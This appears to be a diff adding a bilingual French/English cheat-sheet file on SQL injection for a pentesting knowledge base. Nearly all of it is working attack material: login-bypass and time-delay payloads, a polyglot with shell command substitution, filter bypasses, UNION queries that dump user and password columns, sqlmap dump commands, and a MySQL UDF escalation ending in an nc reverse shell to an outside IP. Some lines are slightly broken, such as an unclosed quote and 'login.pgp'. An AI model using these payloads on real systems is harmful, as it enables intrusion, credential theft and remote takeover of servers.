@@ -1,0 +1,334 @@
+[Intro]
+id=intro
+category=sqli
+title=SQLi
+desc="
+"
+title_en=SQLi
+desc_en="
+"
+
+[principe]
+id=principe
+category=sqli
+keywords=
+title=Principe
+desc="
+Injecter des commandes SQL dans les paramêtres pour réécrire la requête.
+<pre><code>SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
+</code></pre>
+Méthode : fermer la ', élargir la requête avec OR 1=1, ajouter des valeurs avec UNION, commenter la fin de la requête avec # ou -- -
+<pre><code>Valeur des paramètres envoyés :
+USER=admin' OR 1=1 -- -
+PASSWORD=ferrari
+
+Requète SQL obtenue:
+SELECT * FROM user WHERE login='admin' OR 1=1 -- - and password='ferrari';
+</code></pre>
+Envoyer les aparmètres avec Curl:
+<pre><code>curl http://target/login.pgp?login=admin' OR 1=1 -- -&password=ferrari
+</code></pre>
+"
+title_en=Principle
+desc_en="
+Inject SQL commands in the parameters to rewrite the SQL query.
+<pre><code>SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
+</code></pre>
+Method : close the single quote ', whiden the SELECT with OR 1=1, add entries thanks to  UNION, comment the end of the request with # or -- -
+<pre><code>Sent parameters:
+USER=admin' OR 1=1 -- -
+PASSWORD=ferrari
+
+Altered SQL request:
+SELECT * FROM user WHERE login='admin' OR 1=1 -- - and password='ferrari';
+</code></pre>
+Send the Form with custom params thanks to curl:
+<pre><code>curl http://target/login.pgp?login=admin' OR 1=1 -- -&password=ferrari
+</code></pre>
+"
+ 
+[sql - mysql]
+id=sql-mysql
+category=sqli
+keywords=
+title="MySQL/MariaDB - Commandes"
+desc="
+Se connecter à une base mysql distante:
+<pre><code>mysql -u admin --host=10.10.12.10 : sans mot de passe
+mysql -u admin --host=10.10.12.10 -padmin : avec mot de passe
+</code></pre>
+Commandes utiles:
+<pre><code>SELECT @@version;
+SELECT user();
+SHOW Databases;
+USE database;
+SHOW tables;
+SELECT * from table;
+</code></pre>
+"
+title_en="MySQL/MariaDB - Commands"
+desc="
+Connect to a remote mysql database:
+<pre><code>mysql -u admin --host=10.10.12.10 : without password
+mysql -u admin --host=10.10.12.10 -padmin : with password
+</code></pre>
+Usefull commands:
+<pre><code>SELECT @@version;
+SELECT user();
+SHOW Databases;
+USE database;
+SHOW tables;
+SELECT * from table;
+</code></pre>
+"
+
+[detect]
+id=detect
+category=sqli
+keywords=
+title=Détecter une SQLi
+desc="
+Vous êtes devant une page web contenant un formulaire de login/register/search,...
+Saisissez des fermetures de string ' ou \" pour générer une erreur.<br/>
+Injecter un sleep et remarquer un retard de la réponse.
+<pre><code>admin' and sleep(5) and '1'='1
+admin\" and sleep(5) and \"1\"=\"1
+</code></pre>
+"
+title_en=Detect SQLi
+desc_en="
+Inject single quote ' or double quote \" and see an error.<br/>
+Inject Sleep and detect a delayed response.
+<pre><code>admin' and sleep(5) and '1'='1
+admin\" and sleep(5) and \"1\"=\"1
+</code></pre>
+"
+
+[detectpolyglot]
+id=detect
+category=sqli
+keywords=
+title=Détecter une SQLi : Polyglot
+desc="
+Un polyglot est une séquence capable de s'adapter à de nombreux scénario
+<pre><code>/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'\"||sleep(5)||\"`
+</code></pre>
+"
+title_en=Detect SQLi : Polyglot
+desc_en="
+A polyglot is a sequence working for many different scenarios
+<pre><code>a/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'\"||sleep(5)||\"`
+</code></pre>
+"
+
+
+[limit]
+id=limit
+category=sqli
+keywords=
+title=Selectionner une seule entrée
+desc="
+Généralement les développeurs prennent la première entrée. Mais parfois ils vérifient qu'il n'y en a bien qu'une seule.
+<pre><code>admin' or 1=1 LIMIT 1 -- -
+</code></pre>
+"
+title_en=Select only one entry
+desc_en="
+Usually developers take the first entry. But sometimes they check that there is only one.
+<pre><code>admin' or 1=1 LIMIT 1 -- -
+</code></pre>
+"
+
+
+[simplefilter]
+id=simplefilter
+category=sqli
+keywords=
+title=Contourner les filtres simple
+desc="
+Les développeurs filtrent parfois de caractères ou des mot:
+<pre><code>Space => Tab %09, Newline %A0, /**/
+AND   => && %26%26
+OR    => ||
+</code></pre>
+"
+title_en=Bypass simple filters
+desc_en="
+Sometime, SQLi aware developpers filter characters such as space or words such as OR:
+<pre><code>Space => Tab %09, Newline %A0, /**/
+AND   => && %26%26
+OR    => ||
+</code></pre>
+"
+
+
+[union]
+id=union
+category=sqli
+keywords=
+title=Injecter des valeurs avec un UNION
+desc="
+Quand la requête sert à afficher des entrées (ex: liste d'objets), on peut ajouter des valeurs avec un UNION.<br/>
+Il faut commencer par identifier le nombre d'entrées qu'attend le select<br/>
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name=[NAME]
+</code></pre>
+Methode 1: ORDER BY
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 1-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 2-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 3-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 4-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 5-- - : Erreur
+=> 4 entrées
+</code></pre>
+Methode 2: SELECT
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1 : Erreur
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2 : Erreur
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3 : Erreur
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3,4 : Ok
+=> 4 entrées
+</code></pre>
+"
+title_en=Inject values using UNION
+desc_en="
+When the query is used to display entries (e.g. list of objects), values can be added with a UNION.<br/>.
+First, you need to identify the number of entries used by SELECT:<br/>
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name=[NAME]
+</code></pre>
+Methode 1: ORDER BY
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 1-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 2-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 3-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 4-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 5-- - : Error
+=> 4 entries
+</code></pre>
+Methode 2: SELECT
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1 : Error
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2 : Error
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3 : Error
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3,4 : Ok
+=> 4 entries
+</code></pre>
+"
+
+
+
+[uniontablenames]
+id=uniontablenames
+category=sqli
+keywords=
+title=UNION: Table names
+desc="
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -  
+</code></pre>
+"
+title_en=UNION: Table names
+desc_en="
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -  
+</code></pre>
+"
+
+
+[uniontablecolumnnames]
+id=uniontablecolumnnames
+category=sqli
+keywords=
+title=UNION: Table columns names
+desc="
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -
+</code></pre>
+"
+
+
+[uniondumptable]
+id=uniontablecolumnnames
+category=sqli
+keywords=
+title=UNION: Dump table
+desc="
+<pre><code>UNION SELECT concat(name,':',pass),1 FROM users; -- -
+</code></pre>
+"
+
+
+[sqlmap]
+id=sqlmap
+category=sqli
+keywords=
+title=SqlMap
+desc="
+SQLi sur les paramètres d'un GET
+<pre><code>$ sqlmap -u 'http://10.10.10.129/sqli/example1.php?name=root' --dbs --banner
+</code></pre>
+SQLi sur les paramètres d'un POST. <br/>
+Intercepter la requète avec Burp, et la sauver dans un fichier login.txt
+<pre><code>$ sqlmap -r login.txt --dbs --banner
+  -p name : forcer le paramètre à tester
+</code></pre> 
+Lister les tables, puis dumper une table
+<pre><code>$ sqlmap -r login.txt -D jetadmin --tables
+$ sqlmap -r login.txt -D jetadmin -T users --dump
+</code></pre>
+"
+title_en=SqlMap
+desc_en="
+SQLi on GET parameter:
+<pre><code>$ sqlmap -u 'http://10.10.10.129/sqli/example1.php?name=root' --dbs --banner
+</code></pre>
+SQLi on POST parameter:<br/>
+Intercept the request using Burp, and save it in login.txt file.
+<pre><code>$ sqlmap -r login.txt --dbs --banner
+  -p name : parameter to be tested
+</code></pre> 
+List tables, then dumper une table:
+<pre><code>$ sqlmap -r login.txt -D jetadmin --tables
+$ sqlmap -r login.txt -D jetadmin -T users --dump
+</code></pre>
+"
+
+
+
+[mysqludf]
+id=mysqludf
+category=sqli
+keywords=
+title=MySQL: UDF User Defined Function 
+desc="
+Compiler une librairie UDF contenant le fonction sys_exec()<br/>
+L'uploader sur le serveur. La déclarer. La fonction sys_exec() permet de lancer des commandes.
+<pre><code># Tested with : mysql 5.5.60-0+deb8u1
+# Create a 'User Defined Function' calling C function 'system'
+# Use pre-compiled 32 or 64 depending on target.
+# Copy file to /tmp
+create database exploittest;
+use exploittest;
+create table bob(line blob);
+insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
+select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
+create function sys_exec returns int soname 'lib_mysqludf_sys.so';
+select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');
+
+select sys_exec('/bin/sh');
+after bash access, 'bash –p' or 'sudo su'
+</code></pre>
+"
+title_en=MySQL: UDF User Defined Function 
+desc_en="
+Compile a unix library containing the function sys_exec()<br/>
+Uploader the .so file onto the server. Declare the function in MySQL. Now it's possible to use sys_exec() to run shell commands.
+<pre><code># Tested with : mysql 5.5.60-0+deb8u1
+# Create a 'User Defined Function' calling C function 'system'
+# Use pre-compiled 32 or 64 depending on target.
+# Copy file to /tmp
+create database exploittest;
+use exploittest;
+create table bob(line blob);
+insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
+select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
+create function sys_exec returns int soname 'lib_mysqludf_sys.so';
+select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');
+
+select sys_exec('/bin/sh');
+after bash access, 'bash –p' or 'sudo su'
+</code></pre>
+"
